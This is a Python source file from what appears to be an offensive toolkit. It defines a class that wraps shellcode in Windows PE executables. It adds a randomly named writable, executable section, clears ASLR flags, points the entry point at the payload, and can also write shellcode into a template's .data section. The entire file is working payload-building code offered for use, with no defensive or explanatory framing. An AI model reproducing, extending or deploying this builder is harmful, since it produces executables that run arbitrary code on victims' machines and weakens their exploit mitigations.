import os

from teralibs.tsf.core.exe.constants import FILE_ALIGNMENT, SECTION_ALIGNMENT, SECTION_EXECUTE_READ_WRITE
from teralibs.tsf.core.exe.header import arch_offsets, parse, validate_arch
from teralibs.tsf.core.exe.patch import add_write_permission, strip_aslr, update_entry_point, update_size_of_image
from teralibs.tsf.core.exe.section import SectionHeader, accommodate, compute_bounds, increment_count, write
from teralibs.tsf.core.exe.utils import align, random_section_name


class Exe:
    """Builds and patches Windows PE executables for shellcode injection."""

    def __init__(self, arch: str = "x64") -> None:
        self._arch = validate_arch(arch)
        self._template = self._load_template()

    def build(self, code: bytes) -> bytes:
        """Injects shellcode into the PE template as a new randomly named executable section."""
        pe = bytearray(self._template)
        pe_offset, machine = parse(pe)
        ep_offset, _, dll_chars_offset, _ = arch_offsets(machine)

        # Returns the file end boundary and the last section's virtual address and virtual size.
        file_end, last_va, last_vs = compute_bounds(pe, pe_offset)

        payload_va = align(last_va + last_vs, SECTION_ALIGNMENT)
        payload_fileoff = align(file_end, FILE_ALIGNMENT)

        # Clears DYNAMIC_BASE and HIGH_ENTROPY_VA from DllCharacteristics.
        strip_aslr(pe, pe_offset, dll_chars_offset)

        # Grows SizeOfHeaders if needed to fit a new section entry, shifting body data forward.
        pe, slot, payload_fileoff = accommodate(pe, pe_offset, payload_fileoff)

        # Serializes a SectionHeader into a 40-byte entry at the given slot offset.
        write(
            pe,
            slot,
            SectionHeader(
                name=random_section_name(),
                virtual_size=len(code),
                virtual_addr=payload_va,
                raw_size=align(len(code), FILE_ALIGNMENT),
                raw_offset=payload_fileoff,
                characteristics=SECTION_EXECUTE_READ_WRITE,
            ),
        )

        increment_count(pe, pe_offset)
        update_size_of_image(pe, pe_offset, payload_va, len(code))
        update_entry_point(pe, pe_offset, ep_offset, payload_va)

        template_body = bytes(pe)
        template_body = template_body.ljust(payload_fileoff, b"\x00") if len(template_body) < payload_fileoff else template_body[:payload_fileoff]

        return bytes(template_body + code.ljust(align(len(code), FILE_ALIGNMENT), b"\x00"))

    def patch(self, data: bytes | bytearray, section_name: bytes | None = None) -> bytearray:
        """Patches a PE section to allow self-modifying code, clearing ASLR and adding write permission."""
        return add_write_permission(data, section_name)

    def inject(self, data: bytes | bytearray, code: bytes) -> bytearray:
        """Injects shellcode into the PAYLOAD: slot at the start of the .data section."""
        pe = bytearray(data)
        pe_offset = int.from_bytes(pe[0x3C:0x40], "little")
        opt_header_size = int.from_bytes(pe[pe_offset + 0x14 : pe_offset + 0x16], "little")
        section_table_base = pe_offset + 0x18 + opt_header_size

        num_sections = int.from_bytes(pe[pe_offset + 0x06 : pe_offset + 0x08], "little")
        for i in range(num_sections):
            sec_off = section_table_base + (i * 0x28)
            name = pe[sec_off : sec_off + 8].rstrip(b"\x00")

            if name != b".data":
                continue

            raw_size = int.from_bytes(pe[sec_off + 0x10 : sec_off + 0x14], "little")
            file_offset = int.from_bytes(pe[sec_off + 0x14 : sec_off + 0x18], "little")

            if len(code) > raw_size:
                raise ValueError(f"Shellcode ({len(code)} bytes) exceeds .data raw size ({raw_size} bytes).")

            pe[file_offset : file_offset + len(code)] = code
            break

        return pe

    def _load_template(self) -> bytes:
        """Reads the PE template for the configured architecture from disk."""
        path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))),
            "data",
            "template",
            f"template_{self._arch}_windows.exe",
        )
        with open(path, "rb") as f:
            return f.read()

    def __repr__(self) -> str:
        """Returns a developer-facing representation of the EXEBuilder instance."""
        return f"EXEBuilder(arch={self._arch!r})"
